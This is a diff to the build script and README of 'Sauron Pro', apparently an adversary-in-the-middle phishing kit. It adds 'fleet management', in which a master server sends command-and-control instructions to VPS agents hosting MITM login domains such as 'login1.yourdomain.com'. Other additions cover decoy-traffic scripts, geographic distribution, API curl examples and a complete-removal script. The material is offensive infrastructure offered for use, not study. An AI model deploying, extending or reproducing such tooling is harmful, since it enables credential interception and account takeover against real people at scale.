@@ -62,6 +62,166 @@ echo "📜 Copying all scripts..."
 cp scripts/*.sh "$BUILD_DIR/"
 chmod +x "$BUILD_DIR/"*.sh
 
+# Create script organization directories FIRST
+echo "📁 Creating script organization directories..."
+mkdir -p "$BUILD_DIR/fleet"
+mkdir -p "$BUILD_DIR/management"
+
+# Create fleet-specific documentation
+cat > "$BUILD_DIR/fleet/FLEET_SETUP.md" << 'FLEET_EOF'
+# 🌐 Sauron Fleet Management Setup
+
+Deploy and manage multiple VPS instances with centralized control.
+
+## 🎯 Architecture Overview
+
+```
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│   Fleet Master  │────│   VPS Agent 1   │    │   VPS Agent 2   │
+│ admin.domain.com│    │ mitm1.domain.com│    │ mitm2.domain.com│
+│   Port 8443     │    │   Port 443      │    │   Port 443      │
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+        │                        │                        │
+        └─── Command & Control ───┘                       │
+        └─────────── Fleet Monitoring ────────────────────┘
+```
+
+## 🚀 Quick Setup
+
+### Step 1: Deploy Fleet Master
+```bash
+# On your master controller server
+cd sauron/fleet
+sudo ./deploy-fleet-master.sh
+```
+
+### Step 2: Deploy VPS Agents
+```bash
+# On each VPS instance
+cd sauron/fleet
+MASTER_URL=https://admin.yourdomain.com:8443 sudo ./deploy-vps-agent.sh
+```
+
+## 🔧 Configuration
+
+### Master Controller
+- **Domain**: Use a dedicated admin subdomain (e.g., `admin.yourdomain.com`)
+- **Port**: 8443 (fleet management port)
+- **APIs**: `/fleet/*` endpoints for VPS management
+
+### VPS Agents
+- **Domain**: Individual MITM domains (e.g., `login1.yourdomain.com`)
+- **Port**: 443 (standard HTTPS)
+- **APIs**: `/vps/*` endpoints for command receiving
+
+## 📊 Fleet Management APIs
+
+### Master Controller Endpoints
+- `GET /fleet/instances` - List all VPS instances
+- `POST /fleet/command` - Send commands to VPS fleet
+- `POST /fleet/register` - VPS registration endpoint
+
+### VPS Agent Endpoints  
+- `POST /vps/command` - Receive commands from master
+- `GET /vps/status` - Agent health and status
+
+## 🛠️ Fleet Operations
+
+### Add New VPS
+1. Deploy new VPS with agent script
+2. Agent automatically registers with master
+3. Monitor via master dashboard
+
+### Remove VPS
+1. Stop agent service on VPS
+2. Remove from master's instance list
+3. Update DNS if needed
+
+### Update Fleet
+1. Update master controller first
+2. Use master to update all agents
+3. Rolling updates maintain availability
+
+## 🔐 Security
+
+- All communication uses HTTPS with proper certificates
+- Admin key authentication for fleet commands  
+- VPS agents validate master controller identity
+- Encrypted command payload transmission
+
+FLEET_EOF
+
+# Create fleet command reference
+cat > "$BUILD_DIR/fleet/COMMANDS.md" << 'CMD_EOF'
+# 🚁 Fleet Management Commands
+
+## Master Controller Deployment
+```bash
+# Basic deployment
+sudo ./deploy-fleet-master.sh
+
+# With custom domain
+DOMAIN=admin.yourdomain.com sudo ./deploy-fleet-master.sh
+
+# With custom fleet port
+FLEET_PORT=9443 sudo ./deploy-fleet-master.sh
+```
+
+## VPS Agent Deployment
+```bash
+# Basic agent deployment
+MASTER_URL=https://admin.yourdomain.com:8443 sudo ./deploy-vps-agent.sh
+
+# With custom VPS domain
+VPS_DOMAIN=mitm1.yourdomain.com MASTER_URL=https://admin.yourdomain.com:8443 sudo ./deploy-vps-agent.sh
+
+# With custom VPS ID and location
+VPS_ID=london-01 VPS_LOCATION="London, UK" MASTER_URL=https://admin.yourdomain.com:8443 sudo ./deploy-vps-agent.sh
+```
+
+## Fleet API Examples
+```bash
+# List all VPS instances (replace YOUR_ADMIN_KEY)
+curl -H "X-Admin-Key: YOUR_ADMIN_KEY" https://admin.yourdomain.com:8443/fleet/instances
+
+# Send restart command to specific VPS
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"admin_key":"YOUR_ADMIN_KEY","vps_id":"london-01","command":"restart"}' \
+  https://admin.yourdomain.com:8443/fleet/command
+
+# Get VPS status directly
+curl -k https://mitm1.yourdomain.com/vps/status
+```
+
+## Environment Variables
+- `MASTER_URL` - Master controller URL (required for agents)
+- `VPS_DOMAIN` - Agent's public domain (auto-detected if not set)
+- `VPS_ID` - Unique identifier for the VPS (auto-generated if not set)
+- `VPS_LOCATION` - Geographic location description
+- `DOMAIN` - Master controller domain (for master deployment)
+- `FLEET_PORT` - Master controller port (default: 8443)
+
+CMD_EOF
+
+# Fleet management scripts (auto-detect fleet scripts)
+echo "🌐 Setting up fleet management scripts..."
+for script in deploy-fleet-*.sh deploy-vps-*.sh; do
+    if [ -f "$BUILD_DIR/$script" ]; then
+        mv "$BUILD_DIR/$script" "$BUILD_DIR/fleet/"
+        chmod +x "$BUILD_DIR/fleet/$script"
+        echo "  ✅ Fleet script: $script"
+    fi
+done
+
+# Management and maintenance scripts (auto-detect admin scripts)
+for script in admin_*.sh decoy_*.sh manage-*.sh; do
+    if [ -f "$BUILD_DIR/$script" ]; then
+        mv "$BUILD_DIR/$script" "$BUILD_DIR/management/"
+        chmod +x "$BUILD_DIR/management/$script"
+        echo "  ✅ Management script: $script"
+    fi
+done
+
 # Configuration files (if they exist)
 if [ -d "config/" ]; then
     cp -r config/ "$BUILD_DIR/"
@@ -146,6 +306,43 @@ sudo ./install-production.sh
 
 ---
 
+## 🌐 Fleet Management (Multi-VPS Operations)
+
+Sauron Pro supports **distributed MITM operations** across multiple VPS instances with centralized control.
+
+### 🎯 Single VPS Deployment (Standard)
+```bash
+# Standard single-server deployment
+sudo ./install-production.sh
+```
+
+### 🏢 Fleet Master Controller
+```bash
+# Deploy master controller for managing multiple VPS instances
+sudo ./fleet/deploy-fleet-master.sh
+```
+
+### 🚁 VPS Agent Deployment
+```bash
+# Deploy agent on each VPS (connects to master)
+MASTER_URL=https://your-master-domain.com:8443 sudo ./fleet/deploy-vps-agent.sh
+```
+
+### Fleet Architecture
+- **Master Controller**: Centralized management, command dispatch, monitoring
+- **VPS Agents**: Distributed MITM instances reporting to master
+- **Admin Interface**: Fleet-wide monitoring and control
+- **API Endpoints**: `/fleet/*` and `/vps/*` for automation
+
+**Fleet Benefits:**
+- 🌍 Geographic distribution
+- ⚡ Load balancing
+- 📊 Centralized monitoring
+- 🔄 Automated deployment
+- 📱 Remote management
+
+---
+
 ## 🔧 What the Installer Does
 
 The `install-production.sh` script is **fully automated** and handles:
@@ -185,6 +382,38 @@ sudo systemctl status sauron
 
 # View real-time logs
 sudo journalctl -u sauron -f
+
+# Update to latest version
+sudo ./update-sauron-template.sh
+
+# Complete system removal
+sudo ./complete-removal.sh
+```
+
+---
+
+## 📜 Available Scripts
+
+### 🚀 Core Deployment
+- `install-production.sh` - Main installer with interactive setup
+- `setup.sh` - Alternative manual setup
+- `configure-env.sh` - Environment configuration wizard
+
+### 🌐 Fleet Management
+- `fleet/deploy-fleet-master.sh` - Deploy fleet master controller
+- `fleet/deploy-vps-agent.sh` - Deploy VPS agent (connects to master)
+
+### 🔧 Management & Maintenance  
+- `management/admin_cleanup.sh` - Database and log cleanup
+- `management/decoy_control.sh` - Traffic decoy management
+- `management/manage-sauron-pro.sh` - System management utilities
+- `update-sauron-template.sh` - Automated updates
+- `verify-installation.sh` - Health check and diagnostics
+
+### 🛠️ Development & Testing
+- `test-firebase.sh` - Test Firebase connectivity
+- `build-release.sh` - Build release packages
+- `auto-deploy.sh` - Automated deployment pipeline
 
 # Restart if needed
 sudo systemctl restart sauron
@@ -397,6 +626,12 @@ echo "1️⃣  Upload: sauron-linux-amd64.tar.gz to VPS"
 echo "2️⃣  Extract: tar -xzf sauron-linux-amd64.tar.gz"
 echo "3️⃣  Enter: cd sauron"
 echo "4️⃣  Install: sudo ./install-production.sh"
+echo ""
+echo "🌐 FLEET DEPLOYMENT (Multi-VPS):"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "🎯 Master: sudo ./fleet/deploy-fleet-master.sh"
+echo "🚁 Agents: MASTER_URL=https://admin.domain.com:8443 sudo ./fleet/deploy-vps-agent.sh"
+echo "📊 APIs: /fleet/* (master) and /vps/* (agents)"
 echo ""
 echo "✨ That's it! The installer handles everything automatically."
 echo "🎯 3-minute professional deployment guaranteed."
